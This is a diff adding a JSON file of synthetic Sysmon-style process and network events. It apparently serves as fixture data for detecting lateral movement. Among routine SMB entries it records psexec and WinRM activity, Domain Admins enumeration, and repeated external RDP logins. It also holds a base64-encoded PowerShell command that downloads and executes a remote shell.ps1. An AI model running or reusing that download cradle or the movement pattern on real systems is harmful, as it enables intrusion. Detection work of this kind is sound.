@@ -1,0 +1,695 @@
+[
+  {
+    "timestamp": "2026-11-15T09:00:00",
+    "EventID": "3",
+    "SourceIp": "10.0.1.10",
+    "DestinationIp": "10.0.2.50",
+    "DestinationPort": "445",
+    "User": "CORP\\user1",
+    "Image": "C:\\Windows\\explorer.exe"
+  },
+  {
+    "timestamp": "2026-11-15T09:05:00",
+    "EventID": "3",
+    "SourceIp": "10.0.1.11",
+    "DestinationIp": "10.0.2.50",
+    "DestinationPort": "445",
+    "User": "CORP\\user2",
+    "Image": "C:\\Windows\\explorer.exe"
+  },
+  {
+    "timestamp": "2026-11-15T09:10:00",
+    "EventID": "3",
+    "SourceIp": "10.0.1.12",
+    "DestinationIp": "10.0.2.50",
+    "DestinationPort": "445",
+    "User": "CORP\\user3",
+    "Image": "C:\\Windows\\explorer.exe"
+  },
+  {
+    "timestamp": "2026-11-15T09:30:00",
+    "EventID": "3",
+    "SourceIp": "10.0.1.10",
+    "DestinationIp": "10.0.2.50",
+    "DestinationPort": "445",
+    "User": "CORP\\user1",
+    "Image": "C:\\Windows\\explorer.exe"
+  },
+  {
+    "timestamp": "2026-11-15T09:35:00",
+    "EventID": "3",
+    "SourceIp": "10.0.1.11",
+    "DestinationIp": "10.0.2.50",
+    "DestinationPort": "445",
+    "User": "CORP\\user2",
+    "Image": "C:\\Windows\\explorer.exe"
+  },
+  {
+    "timestamp": "2026-11-15T09:40:00",
+    "EventID": "3",
+    "SourceIp": "10.0.1.12",
+    "DestinationIp": "10.0.2.50",
+    "DestinationPort": "445",
+    "User": "CORP\\user3",
+    "Image": "C:\\Windows\\explorer.exe"
+  },
+  {
+    "timestamp": "2026-11-15T10:00:00",
+    "EventID": "3",
+    "SourceIp": "10.0.1.10",
+    "DestinationIp": "10.0.2.50",
+    "DestinationPort": "445",
+    "User": "CORP\\user1",
+    "Image": "C:\\Windows\\explorer.exe"
+  },
+  {
+    "timestamp": "2026-11-15T10:00:00",
+    "EventID": "1",
+    "Computer": "10.0.1.11",
+    "User": "CORP\\user2",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "Image": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "cmd.exe /c dir"
+  },
+  {
+    "timestamp": "2026-11-15T10:05:00",
+    "EventID": "3",
+    "SourceIp": "10.0.1.11",
+    "DestinationIp": "10.0.2.50",
+    "DestinationPort": "445",
+    "User": "CORP\\user2",
+    "Image": "C:\\Windows\\explorer.exe"
+  },
+  {
+    "timestamp": "2026-11-15T10:10:00",
+    "EventID": "3",
+    "SourceIp": "10.0.1.12",
+    "DestinationIp": "10.0.2.50",
+    "DestinationPort": "445",
+    "User": "CORP\\user3",
+    "Image": "C:\\Windows\\explorer.exe"
+  },
+  {
+    "timestamp": "2026-11-15T10:15:00",
+    "EventID": "1",
+    "Computer": "10.0.1.11",
+    "User": "CORP\\user2",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "Image": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "cmd.exe /c dir"
+  },
+  {
+    "timestamp": "2026-11-15T10:30:00",
+    "EventID": "3",
+    "SourceIp": "10.0.1.10",
+    "DestinationIp": "10.0.2.50",
+    "DestinationPort": "445",
+    "User": "CORP\\user1",
+    "Image": "C:\\Windows\\explorer.exe"
+  },
+  {
+    "timestamp": "2026-11-15T10:30:00",
+    "EventID": "1",
+    "Computer": "10.0.1.11",
+    "User": "CORP\\user2",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "Image": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "cmd.exe /c dir"
+  },
+  {
+    "timestamp": "2026-11-15T10:35:00",
+    "EventID": "3",
+    "SourceIp": "10.0.1.11",
+    "DestinationIp": "10.0.2.50",
+    "DestinationPort": "445",
+    "User": "CORP\\user2",
+    "Image": "C:\\Windows\\explorer.exe"
+  },
+  {
+    "timestamp": "2026-11-15T10:40:00",
+    "EventID": "3",
+    "SourceIp": "10.0.1.12",
+    "DestinationIp": "10.0.2.50",
+    "DestinationPort": "445",
+    "User": "CORP\\user3",
+    "Image": "C:\\Windows\\explorer.exe"
+  },
+  {
+    "timestamp": "2026-11-15T10:45:00",
+    "EventID": "1",
+    "Computer": "10.0.1.11",
+    "User": "CORP\\user2",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "Image": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "cmd.exe /c dir"
+  },
+  {
+    "timestamp": "2026-11-15T11:00:00",
+    "EventID": "3",
+    "SourceIp": "10.0.1.10",
+    "DestinationIp": "10.0.2.50",
+    "DestinationPort": "445",
+    "User": "CORP\\user1",
+    "Image": "C:\\Windows\\explorer.exe"
+  },
+  {
+    "timestamp": "2026-11-15T11:00:00",
+    "EventID": "1",
+    "Computer": "10.0.1.11",
+    "User": "CORP\\user2",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "Image": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "cmd.exe /c dir"
+  },
+  {
+    "timestamp": "2026-11-15T11:05:00",
+    "EventID": "3",
+    "SourceIp": "10.0.1.11",
+    "DestinationIp": "10.0.2.50",
+    "DestinationPort": "445",
+    "User": "CORP\\user2",
+    "Image": "C:\\Windows\\explorer.exe"
+  },
+  {
+    "timestamp": "2026-11-15T11:10:00",
+    "EventID": "3",
+    "SourceIp": "10.0.1.12",
+    "DestinationIp": "10.0.2.50",
+    "DestinationPort": "445",
+    "User": "CORP\\user3",
+    "Image": "C:\\Windows\\explorer.exe"
+  },
+  {
+    "timestamp": "2026-11-15T11:15:00",
+    "EventID": "1",
+    "Computer": "10.0.1.11",
+    "User": "CORP\\user2",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "Image": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "cmd.exe /c dir"
+  },
+  {
+    "timestamp": "2026-11-15T11:30:00",
+    "EventID": "3",
+    "SourceIp": "10.0.1.10",
+    "DestinationIp": "10.0.2.50",
+    "DestinationPort": "445",
+    "User": "CORP\\user1",
+    "Image": "C:\\Windows\\explorer.exe"
+  },
+  {
+    "timestamp": "2026-11-15T11:30:00",
+    "EventID": "1",
+    "Computer": "10.0.1.11",
+    "User": "CORP\\user2",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "Image": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "cmd.exe /c dir"
+  },
+  {
+    "timestamp": "2026-11-15T11:35:00",
+    "EventID": "3",
+    "SourceIp": "10.0.1.11",
+    "DestinationIp": "10.0.2.50",
+    "DestinationPort": "445",
+    "User": "CORP\\user2",
+    "Image": "C:\\Windows\\explorer.exe"
+  },
+  {
+    "timestamp": "2026-11-15T11:40:00",
+    "EventID": "3",
+    "SourceIp": "10.0.1.12",
+    "DestinationIp": "10.0.2.50",
+    "DestinationPort": "445",
+    "User": "CORP\\user3",
+    "Image": "C:\\Windows\\explorer.exe"
+  },
+  {
+    "timestamp": "2026-11-15T11:45:00",
+    "EventID": "1",
+    "Computer": "10.0.1.11",
+    "User": "CORP\\user2",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "Image": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "cmd.exe /c dir"
+  },
+  {
+    "timestamp": "2026-11-15T12:00:00",
+    "EventID": "3",
+    "SourceIp": "10.0.1.10",
+    "DestinationIp": "10.0.2.50",
+    "DestinationPort": "445",
+    "User": "CORP\\user1",
+    "Image": "C:\\Windows\\explorer.exe"
+  },
+  {
+    "timestamp": "2026-11-15T12:00:00",
+    "EventID": "1",
+    "Computer": "10.0.1.11",
+    "User": "CORP\\user2",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "Image": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "cmd.exe /c dir"
+  },
+  {
+    "timestamp": "2026-11-15T12:05:00",
+    "EventID": "3",
+    "SourceIp": "10.0.1.11",
+    "DestinationIp": "10.0.2.50",
+    "DestinationPort": "445",
+    "User": "CORP\\user2",
+    "Image": "C:\\Windows\\explorer.exe"
+  },
+  {
+    "timestamp": "2026-11-15T12:10:00",
+    "EventID": "3",
+    "SourceIp": "10.0.1.12",
+    "DestinationIp": "10.0.2.50",
+    "DestinationPort": "445",
+    "User": "CORP\\user3",
+    "Image": "C:\\Windows\\explorer.exe"
+  },
+  {
+    "timestamp": "2026-11-15T12:15:00",
+    "EventID": "3",
+    "SourceIp": "10.0.1.10",
+    "DestinationIp": "10.0.3.5",
+    "DestinationPort": "445",
+    "User": "CORP\\svc_backup",
+    "Image": "C:\\Tools\\psexec.exe"
+  },
+  {
+    "timestamp": "2026-11-15T12:15:00",
+    "EventID": "1",
+    "Computer": "10.0.1.11",
+    "User": "CORP\\user2",
+    "ParentImage": "C:\\Windows\\explorer.exe",
+    "Image": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "cmd.exe /c dir"
+  },
+  {
+    "timestamp": "2026-11-15T12:15:30",
+    "EventID": "3",
+    "SourceIp": "10.0.1.10",
+    "DestinationIp": "10.0.3.5",
+    "DestinationPort": "5985",
+    "User": "CORP\\svc_backup",
+    "Image": "C:\\Windows\\System32\\wsmprovhost.exe"
+  },
+  {
+    "timestamp": "2026-11-15T12:16:00",
+    "EventID": "1",
+    "Computer": "10.0.3.5",
+    "User": "CORP\\svc_backup",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "Image": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "cmd.exe /c whoami && net group \"Domain Admins\" /domain"
+  },
+  {
+    "timestamp": "2026-11-15T12:16:10",
+    "EventID": "1",
+    "Computer": "10.0.3.5",
+    "User": "CORP\\svc_backup",
+    "ParentImage": "C:\\Windows\\System32\\wmiprvse.exe",
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "CommandLine": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAALwBzAGgAZQBsAGwALgBwAHMAMQAnACkA"
+  },
+  {
+    "timestamp": "2026-11-15T12:17:00",
+    "EventID": "3",
+    "SourceIp": "10.0.1.10",
+    "DestinationIp": "10.0.3.5",
+    "DestinationPort": "445",
+    "User": "CORP\\svc_backup",
+    "Image": "C:\\Tools\\psexec.exe"
+  },
+  {
+    "timestamp": "2026-11-15T12:17:30",
+    "EventID": "3",
+    "SourceIp": "10.0.1.10",
+    "DestinationIp": "10.0.3.5",
+    "DestinationPort": "5985",
+    "User": "CORP\\svc_backup",
+    "Image": "C:\\Windows\\System32\\wsmprovhost.exe"
+  },
+  {
+    "timestamp": "2026-11-15T12:19:00",
+    "EventID": "3",
+    "SourceIp": "10.0.1.10",
+    "DestinationIp": "10.0.3.5",
+    "DestinationPort": "445",
+    "User": "CORP\\svc_backup",
+    "Image": "C:\\Tools\\psexec.exe"
+  },
+  {
+    "timestamp": "2026-11-15T12:19:00",
+    "EventID": "1",
+    "Computer": "10.0.3.5",
+    "User": "CORP\\svc_backup",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "Image": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "cmd.exe /c whoami && net group \"Domain Admins\" /domain"
+  },
+  {
+    "timestamp": "2026-11-15T12:19:10",
+    "EventID": "1",
+    "Computer": "10.0.3.5",
+    "User": "CORP\\svc_backup",
+    "ParentImage": "C:\\Windows\\System32\\wmiprvse.exe",
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "CommandLine": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAALwBzAGgAZQBsAGwALgBwAHMAMQAnACkA"
+  },
+  {
+    "timestamp": "2026-11-15T12:19:30",
+    "EventID": "3",
+    "SourceIp": "10.0.1.10",
+    "DestinationIp": "10.0.3.5",
+    "DestinationPort": "5985",
+    "User": "CORP\\svc_backup",
+    "Image": "C:\\Windows\\System32\\wsmprovhost.exe"
+  },
+  {
+    "timestamp": "2026-11-15T12:21:00",
+    "EventID": "3",
+    "SourceIp": "10.0.1.10",
+    "DestinationIp": "10.0.3.5",
+    "DestinationPort": "445",
+    "User": "CORP\\svc_backup",
+    "Image": "C:\\Tools\\psexec.exe"
+  },
+  {
+    "timestamp": "2026-11-15T12:21:30",
+    "EventID": "3",
+    "SourceIp": "10.0.1.10",
+    "DestinationIp": "10.0.3.5",
+    "DestinationPort": "5985",
+    "User": "CORP\\svc_backup",
+    "Image": "C:\\Windows\\System32\\wsmprovhost.exe"
+  },
+  {
+    "timestamp": "2026-11-15T12:22:00",
+    "EventID": "1",
+    "Computer": "10.0.3.5",
+    "User": "CORP\\svc_backup",
+    "ParentImage": "C:\\Windows\\System32\\services.exe",
+    "Image": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "cmd.exe /c whoami && net group \"Domain Admins\" /domain"
+  },
+  {
+    "timestamp": "2026-11-15T12:22:10",
+    "EventID": "1",
+    "Computer": "10.0.3.5",
+    "User": "CORP\\svc_backup",
+    "ParentImage": "C:\\Windows\\System32\\wmiprvse.exe",
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "CommandLine": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAALwBzAGgAZQBsAGwALgBwAHMAMQAnACkA"
+  },
+  {
+    "timestamp": "2026-11-15T12:23:00",
+    "EventID": "3",
+    "SourceIp": "10.0.1.10",
+    "DestinationIp": "10.0.3.5",
+    "DestinationPort": "445",
+    "User": "CORP\\svc_backup",
+    "Image": "C:\\Tools\\psexec.exe"
+  },
+  {
+    "timestamp": "2026-11-15T12:23:30",
+    "EventID": "3",
+    "SourceIp": "10.0.1.10",
+    "DestinationIp": "10.0.3.5",
+    "DestinationPort": "5985",
+    "User": "CORP\\svc_backup",
+    "Image": "C:\\Windows\\System32\\wsmprovhost.exe"
+  },
+  {
+    "timestamp": "2026-11-15T12:30:00",
+    "EventID": "3",
+    "SourceIp": "10.0.1.10",
+    "DestinationIp": "10.0.2.50",
+    "DestinationPort": "445",
+    "User": "CORP\\user1",
+    "Image": "C:\\Windows\\explorer.exe"
+  },
+  {
+    "timestamp": "2026-11-15T12:35:00",
+    "EventID": "3",
+    "SourceIp": "10.0.1.11",
+    "DestinationIp": "10.0.2.50",
+    "DestinationPort": "445",
+    "User": "CORP\\user2",
+    "Image": "C:\\Windows\\explorer.exe"
+  },
+  {
+    "timestamp": "2026-11-15T12:40:00",
+    "EventID": "3",
+    "SourceIp": "10.0.1.12",
+    "DestinationIp": "10.0.2.50",
+    "DestinationPort": "445",
+    "User": "CORP\\user3",
+    "Image": "C:\\Windows\\explorer.exe"
+  },
+  {
+    "timestamp": "2026-11-15T13:00:00",
+    "EventID": "3",
+    "SourceIp": "10.0.1.10",
+    "DestinationIp": "10.0.2.50",
+    "DestinationPort": "445",
+    "User": "CORP\\user1",
+    "Image": "C:\\Windows\\explorer.exe"
+  },
+  {
+    "timestamp": "2026-11-15T13:05:00",
+    "EventID": "3",
+    "SourceIp": "10.0.1.11",
+    "DestinationIp": "10.0.2.50",
+    "DestinationPort": "445",
+    "User": "CORP\\user2",
+    "Image": "C:\\Windows\\explorer.exe"
+  },
+  {
+    "timestamp": "2026-11-15T13:10:00",
+    "EventID": "3",
+    "SourceIp": "10.0.1.12",
+    "DestinationIp": "10.0.2.50",
+    "DestinationPort": "445",
+    "User": "CORP\\user3",
+    "Image": "C:\\Windows\\explorer.exe"
+  },
+  {
+    "timestamp": "2026-11-15T13:30:00",
+    "EventID": "3",
+    "SourceIp": "10.0.1.10",
+    "DestinationIp": "10.0.2.50",
+    "DestinationPort": "445",
+    "User": "CORP\\user1",
+    "Image": "C:\\Windows\\explorer.exe"
+  },
+  {
+    "timestamp": "2026-11-15T13:35:00",
+    "EventID": "3",
+    "SourceIp": "10.0.1.11",
+    "DestinationIp": "10.0.2.50",
+    "DestinationPort": "445",
+    "User": "CORP\\user2",
+    "Image": "C:\\Windows\\explorer.exe"
+  },
+  {
+    "timestamp": "2026-11-15T13:40:00",
+    "EventID": "3",
+    "SourceIp": "10.0.1.12",
+    "DestinationIp": "10.0.2.50",
+    "DestinationPort": "445",
+    "User": "CORP\\user3",
+    "Image": "C:\\Windows\\explorer.exe"
+  },
+  {
+    "timestamp": "2026-11-15T14:00:00",
+    "EventID": "3",
+    "SourceIp": "10.0.1.10",
+    "DestinationIp": "10.0.2.50",
+    "DestinationPort": "445",
+    "User": "CORP\\user1",
+    "Image": "C:\\Windows\\explorer.exe"
+  },
+  {
+    "timestamp": "2026-11-15T14:00:00",
+    "EventID": "3",
+    "SourceIp": "192.168.99.5",
+    "DestinationIp": "10.0.1.12",
+    "DestinationPort": "3389",
+    "User": "CORP\\admin_temp",
+    "Image": "C:\\Windows\\System32\\mstsc.exe"
+  },
+  {
+    "timestamp": "2026-11-15T14:05:00",
+    "EventID": "3",
+    "SourceIp": "10.0.1.11",
+    "DestinationIp": "10.0.2.50",
+    "DestinationPort": "445",
+    "User": "CORP\\user2",
+    "Image": "C:\\Windows\\explorer.exe"
+  },
+  {
+    "timestamp": "2026-11-15T14:10:00",
+    "EventID": "3",
+    "SourceIp": "10.0.1.12",
+    "DestinationIp": "10.0.2.50",
+    "DestinationPort": "445",
+    "User": "CORP\\user3",
+    "Image": "C:\\Windows\\explorer.exe"
+  },
+  {
+    "timestamp": "2026-11-15T14:10:00",
+    "EventID": "3",
+    "SourceIp": "192.168.99.5",
+    "DestinationIp": "10.0.1.12",
+    "DestinationPort": "3389",
+    "User": "CORP\\admin_temp",
+    "Image": "C:\\Windows\\System32\\mstsc.exe"
+  },
+  {
+    "timestamp": "2026-11-15T14:20:00",
+    "EventID": "3",
+    "SourceIp": "192.168.99.5",
+    "DestinationIp": "10.0.1.12",
+    "DestinationPort": "3389",
+    "User": "CORP\\admin_temp",
+    "Image": "C:\\Windows\\System32\\mstsc.exe"
+  },
+  {
+    "timestamp": "2026-11-15T14:30:00",
+    "EventID": "3",
+    "SourceIp": "10.0.1.10",
+    "DestinationIp": "10.0.2.50",
+    "DestinationPort": "445",
+    "User": "CORP\\user1",
+    "Image": "C:\\Windows\\explorer.exe"
+  },
+  {
+    "timestamp": "2026-11-15T14:35:00",
+    "EventID": "3",
+    "SourceIp": "10.0.1.11",
+    "DestinationIp": "10.0.2.50",
+    "DestinationPort": "445",
+    "User": "CORP\\user2",
+    "Image": "C:\\Windows\\explorer.exe"
+  },
+  {
+    "timestamp": "2026-11-15T14:40:00",
+    "EventID": "3",
+    "SourceIp": "10.0.1.12",
+    "DestinationIp": "10.0.2.50",
+    "DestinationPort": "445",
+    "User": "CORP\\user3",
+    "Image": "C:\\Windows\\explorer.exe"
+  },
+  {
+    "timestamp": "2026-11-15T15:00:00",
+    "EventID": "3",
+    "SourceIp": "10.0.1.10",
+    "DestinationIp": "10.0.2.50",
+    "DestinationPort": "445",
+    "User": "CORP\\user1",
+    "Image": "C:\\Windows\\explorer.exe"
+  },
+  {
+    "timestamp": "2026-11-15T15:05:00",
+    "EventID": "3",
+    "SourceIp": "10.0.1.11",
+    "DestinationIp": "10.0.2.50",
+    "DestinationPort": "445",
+    "User": "CORP\\user2",
+    "Image": "C:\\Windows\\explorer.exe"
+  },
+  {
+    "timestamp": "2026-11-15T15:10:00",
+    "EventID": "3",
+    "SourceIp": "10.0.1.12",
+    "DestinationIp": "10.0.2.50",
+    "DestinationPort": "445",
+    "User": "CORP\\user3",
+    "Image": "C:\\Windows\\explorer.exe"
+  },
+  {
+    "timestamp": "2026-11-15T15:30:00",
+    "EventID": "3",
+    "SourceIp": "10.0.1.10",
+    "DestinationIp": "10.0.2.50",
+    "DestinationPort": "445",
+    "User": "CORP\\user1",
+    "Image": "C:\\Windows\\explorer.exe"
+  },
+  {
+    "timestamp": "2026-11-15T15:35:00",
+    "EventID": "3",
+    "SourceIp": "10.0.1.11",
+    "DestinationIp": "10.0.2.50",
+    "DestinationPort": "445",
+    "User": "CORP\\user2",
+    "Image": "C:\\Windows\\explorer.exe"
+  },
+  {
+    "timestamp": "2026-11-15T15:40:00",
+    "EventID": "3",
+    "SourceIp": "10.0.1.12",
+    "DestinationIp": "10.0.2.50",
+    "DestinationPort": "445",
+    "User": "CORP\\user3",
+    "Image": "C:\\Windows\\explorer.exe"
+  },
+  {
+    "timestamp": "2026-11-15T16:00:00",
+    "EventID": "3",
+    "SourceIp": "10.0.1.10",
+    "DestinationIp": "10.0.2.50",
+    "DestinationPort": "445",
+    "User": "CORP\\user1",
+    "Image": "C:\\Windows\\explorer.exe"
+  },
+  {
+    "timestamp": "2026-11-15T16:05:00",
+    "EventID": "3",
+    "SourceIp": "10.0.1.11",
+    "DestinationIp": "10.0.2.50",
+    "DestinationPort": "445",
+    "User": "CORP\\user2",
+    "Image": "C:\\Windows\\explorer.exe"
+  },
+  {
+    "timestamp": "2026-11-15T16:10:00",
+    "EventID": "3",
+    "SourceIp": "10.0.1.12",
+    "DestinationIp": "10.0.2.50",
+    "DestinationPort": "445",
+    "User": "CORP\\user3",
+    "Image": "C:\\Windows\\explorer.exe"
+  },
+  {
+    "timestamp": "2026-11-15T16:30:00",
+    "EventID": "3",
+    "SourceIp": "10.0.1.10",
+    "DestinationIp": "10.0.2.50",
+    "DestinationPort": "445",
+    "User": "CORP\\user1",
+    "Image": "C:\\Windows\\explorer.exe"
+  },
+  {
+    "timestamp": "2026-11-15T16:35:00",
+    "EventID": "3",
+    "SourceIp": "10.0.1.11",
+    "DestinationIp": "10.0.2.50",
+    "DestinationPort": "445",
+    "User": "CORP\\user2",
+    "Image": "C:\\Windows\\explorer.exe"
+  },
+  {
+    "timestamp": "2026-11-15T16:40:00",
+    "EventID": "3",
+    "SourceIp": "10.0.1.12",
+    "DestinationIp": "10.0.2.50",
+    "DestinationPort": "445",
+    "User": "CORP\\user3",
+    "Image": "C:\\Windows\\explorer.exe"
+  }
+]
